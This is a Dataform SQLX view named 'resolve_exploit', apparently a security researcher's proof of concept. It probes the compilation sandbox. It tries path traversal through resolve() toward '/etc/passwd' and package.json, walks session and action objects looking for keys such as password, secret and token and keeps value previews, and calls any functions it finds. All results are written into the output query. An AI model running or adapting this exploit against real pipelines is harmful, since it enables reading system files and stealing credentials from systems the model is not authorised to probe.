config { type: "view", name: "resolve_exploit" }

js {
  let results = {
    probeTime: new Date().toISOString(),
    purpose: "Exploit the resolve() function for path traversal and information disclosure"
  };

  // =============================================================================
  // TEST 1: Analyze resolve function implementation
  // =============================================================================
  results.test1_resolveAnalysis = {};
  try {
    if (typeof resolve !== 'function') {
      results.test1_resolveAnalysis = { error: "resolve is not a function" };
    } else {
      const resolveStr = resolve.toString();

      results.test1_resolveAnalysis = {
        status: "completed",
        resolveSource: resolveStr,
        length: resolve.length
      };
    }
  } catch(e) {
    results.test1_resolveAnalysis = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 2: Path Traversal with resolve()
  // =============================================================================
  results.test2_pathTraversal = {};
  try {
    const traversalResults = {};

    const paths = [
      '../package.json',
      '../../package.json',
      '../../../etc/passwd',
      '../../../../etc/passwd',
      '../node_modules',
      './index',
      '../index',
      '../../index',
      '../definitions/simple_test',
      '../../definitions/simple_test'
    ];

    for (const p of paths) {
      try {
        // resolve() takes (path, currentDir)
        const result = resolve(p, '');
        traversalResults[p] = { success: true, result: String(result).substring(0, 200) };
      } catch(e) {
        traversalResults[p] = { success: false, error: e.message.substring(0, 100) };
      }
    }

    results.test2_pathTraversal = {
      status: "completed",
      traversalResults
    };
  } catch(e) {
    results.test2_pathTraversal = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 3: Resolve with various base directories
  // =============================================================================
  results.test3_baseDirs = {};
  try {
    const baseDirResults = {};

    const baseDirs = [
      '',
      '.',
      '..',
      '/',
      '/etc',
      '/tmp',
      'definitions',
      '../',
      '../../'
    ];

    for (const baseDir of baseDirs) {
      try {
        const result = resolve('index', baseDir);
        baseDirResults[baseDir] = { success: true, result: String(result).substring(0, 200) };
      } catch(e) {
        baseDirResults[baseDir] = { success: false, error: e.message.substring(0, 100) };
      }
    }

    results.test3_baseDirs = {
      status: "completed",
      baseDirResults
    };
  } catch(e) {
    results.test3_baseDirs = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 4: Session Object Deep Inspection
  // =============================================================================
  results.test4_sessionDeep = {};
  try {
    // Try to access session from actions
    if (dataform && dataform.actions && dataform.actions[0]) {
      const action = dataform.actions[0];

      const sessionInfo = {
        hasSession: 'session' in action,
        sessionType: action.session ? typeof action.session : null,
        sessionKeys: action.session ? Object.keys(action.session).slice(0, 20) : null
      };

      // Check if session has any credentials
      if (action.session) {
        const session = action.session;
        const credentialKeys = [];
        for (const key of Object.keys(session)) {
          if (/key|secret|token|password|credential|auth|private/i.test(key)) {
            credentialKeys.push({
              key,
              type: typeof session[key],
              value: typeof session[key] === 'string' ?
                session[key].substring(0, 50) : typeof session[key]
            });
          }
        }
        sessionInfo.credentialKeys = credentialKeys;
      }

      results.test4_sessionDeep = {
        status: "completed",
        sessionInfo
      };
    } else {
      results.test4_sessionDeep = { error: "No actions available" };
    }
  } catch(e) {
    results.test4_sessionDeep = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 5: Proto Object Inspection
  // =============================================================================
  results.test5_protoObj = {};
  try {
    if (dataform && dataform.actions && dataform.actions[0] && dataform.actions[0].proto) {
      const proto = dataform.actions[0].proto;

      const protoInfo = {
        type: typeof proto,
        keys: Object.keys(proto).slice(0, 30),
        proto: {}
      };

      // Deep inspect proto
      for (const key of Object.keys(proto).slice(0, 15)) {
        const val = proto[key];
        protoInfo.proto[key] = {
          type: typeof val,
          value: typeof val === 'string' ? val.substring(0, 100) :
                 typeof val === 'object' && val !== null ? Object.keys(val).slice(0, 5) :
                 val
        };
      }

      results.test5_protoObj = {
        status: "completed",
        protoInfo
      };
    } else {
      results.test5_protoObj = { error: "No proto object available" };
    }
  } catch(e) {
    results.test5_protoObj = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 6: Config Path and File Info
  // =============================================================================
  results.test6_configPath = {};
  try {
    const configPaths = [];

    if (dataform && dataform.actions) {
      for (let i = 0; i < Math.min(10, dataform.actions.length); i++) {
        const action = dataform.actions[i];
        if (action.configPath) {
          configPaths.push({
            index: i,
            configPath: action.configPath
          });
        }
      }
    }

    results.test6_configPath = {
      status: "completed",
      configPaths
    };
  } catch(e) {
    results.test6_configPath = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 7: Contextable Query Analysis
  // =============================================================================
  results.test7_contextableQuery = {};
  try {
    const queries = [];

    if (dataform && dataform.actions) {
      for (let i = 0; i < Math.min(5, dataform.actions.length); i++) {
        const action = dataform.actions[i];
        if (action.contextableQuery) {
          const cq = action.contextableQuery;
          queries.push({
            index: i,
            type: typeof cq,
            isFunction: typeof cq === 'function',
            keys: typeof cq === 'object' ? Object.keys(cq).slice(0, 10) : null
          });

          // If it's callable, try to call it
          if (typeof cq === 'function') {
            try {
              const result = cq({});  // Try with empty context
              queries[queries.length - 1].callResult = {
                type: typeof result,
                preview: String(result).substring(0, 200)
              };
            } catch(e) {
              queries[queries.length - 1].callError = e.message.substring(0, 100);
            }
          }
        }
      }
    }

    results.test7_contextableQuery = {
      status: "completed",
      queries
    };
  } catch(e) {
    results.test7_contextableQuery = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 8: Ref Function Analysis
  // =============================================================================
  results.test8_refFunc = {};
  try {
    if (typeof ref !== 'function') {
      results.test8_refFunc = { error: "ref is not a function" };
    } else {
      // ref() is used to reference other tables
      const refTests = [];

      // Try various ref calls
      const testRefs = [
        'simple_test',
        'dataform_poc.simple_test',
        'shir-research-3.dataform_poc.simple_test',
        '../simple_test'
      ];

      for (const r of testRefs) {
        try {
          const result = ref(r);
          refTests.push({
            input: r,
            success: true,
            result: String(result).substring(0, 200)
          });
        } catch(e) {
          refTests.push({
            input: r,
            success: false,
            error: e.message.substring(0, 100)
          });
        }
      }

      results.test8_refFunc = {
        status: "completed",
        refTests
      };
    }
  } catch(e) {
    results.test8_refFunc = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 9: Dump All Actions Proto Fields
  // =============================================================================
  results.test9_allProtos = {};
  try {
    const allProtos = [];

    if (dataform && dataform.actions) {
      for (let i = 0; i < Math.min(20, dataform.actions.length); i++) {
        const action = dataform.actions[i];
        if (action.proto) {
          const proto = action.proto;
          allProtos.push({
            index: i,
            target: proto.target ? {
              database: proto.target.database,
              schema: proto.target.schema,
              name: proto.target.name
            } : null,
            fileName: proto.fileName,
            type: proto.relation?.relationType || proto.type
          });
        }
      }
    }

    results.test9_allProtos = {
      status: "completed",
      allProtos
    };
  } catch(e) {
    results.test9_allProtos = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 10: Look for Credentials in All Action Properties
  // =============================================================================
  results.test10_actionCreds = {};
  try {
    const creds = [];

    function searchCreds(obj, path, depth) {
      if (depth > 5 || !obj || typeof obj !== 'object') return;

      for (const key of Object.keys(obj)) {
        const lowerKey = key.toLowerCase();
        if (/password|secret|token|credential|apikey|privatekey|authkey/i.test(lowerKey)) {
          creds.push({
            path: path + '.' + key,
            type: typeof obj[key],
            preview: typeof obj[key] === 'string' ?
              obj[key].substring(0, 30) : typeof obj[key]
          });
        }
        if (typeof obj[key] === 'object' && obj[key] !== null) {
          searchCreds(obj[key], path + '.' + key, depth + 1);
        }
      }
    }

    if (dataform && dataform.actions) {
      for (let i = 0; i < Math.min(5, dataform.actions.length); i++) {
        searchCreds(dataform.actions[i], 'action[' + i + ']', 0);
      }
    }

    results.test10_actionCreds = {
      status: "completed",
      credentialsFound: creds.length,
      creds: creds.slice(0, 20)
    };
  } catch(e) {
    results.test10_actionCreds = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // SUMMARY
  // =============================================================================
  results.summary = {
    testsRun: 10,
    allCompleted: Object.keys(results).filter(k =>
      k.startsWith("test") && results[k].status === "completed"
    ).length,
    criticalFindings: []
  };

  // Check for findings
  if (results.test2_pathTraversal) {
    const traversals = results.test2_pathTraversal.traversalResults || {};
    const successful = Object.entries(traversals).filter(([k, v]) => v.success);
    if (successful.length > 0) {
      results.summary.criticalFindings.push("resolve() path traversal worked: " + successful.length + " paths");
    }
  }
}

SELECT '${JSON.stringify(results, null, 2)}' as resolve_exploit
